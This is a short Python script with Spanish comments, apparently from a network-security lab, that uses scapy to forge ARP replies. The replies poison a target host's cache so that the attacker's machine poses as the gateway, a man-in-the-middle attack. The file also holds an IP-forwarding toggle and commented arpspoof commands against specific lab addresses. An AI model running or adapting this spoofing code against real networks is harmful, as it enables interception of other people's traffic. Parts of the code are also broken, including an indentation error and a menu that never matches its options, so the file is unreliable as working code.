import os
from scapy.all import * 
#os.sys("echo 1 > /proc/sys/net/ipv4/ip_forward")

def cambiar_fw(valor):
	f=open("/proc/sys/net/ipv4/ip_forward","w")
	s=str(valor)
	f.write(s)
	f.close()
	
def menuForwarding():
	print("0)Sin Forwarding")
	print("1)Con Forwarding")
	teclado = input()

	if  (teclado == 0):
		cambiar_fw(0)
		print("Desactivando Forwarding")
	elif (teclado == 1):
		cambiar_fw(1)
		print("Activando Forwarding") 


#def mitm(ip_objetivo,ip_gateway):

#menuForwarding()

#os.system("echo hola")


#arpspoof -i eth3 -t Objetivo Gateway

#arpspoof -i eth3 -t Gateway Objetivo

#arpspoof -i eth0 -t 10.0.2.4 10.0.2.1
#arpspoof -i eth0 -t 10.0.2.1 10.0.2.4

p=Ether()/ARP()

p[Ether].dst="08:00:27:7c:4b:c5"
p[Ether].src="08:00:27:95:8c:5e"
p[ARP].op="is-at"
p[ARP].hwsrc="08:00:27:95:8c:5e"
p[ARP].psrc="10.0.2.1"
p[ARP].hwdst="08:00:27:7c:4b:c5"
p[ARP].pdst="10.0.2.4"
"""p=Ether(dst=08:00:27:7c:4b:c5)/ARP()
p[ARP].op="is-at"
p[ARP].hwsrc=MAC_PROPIA
p[ARP].psrc=IP_GATEWAY
p[ARP].hwdst=MAC_OBJETIVO
p[ARP].pdst=IP_Objetivo
"""
print("0)Dejar de enviar paquetes") 
	sendp(p*1000,inter=1)
p.show()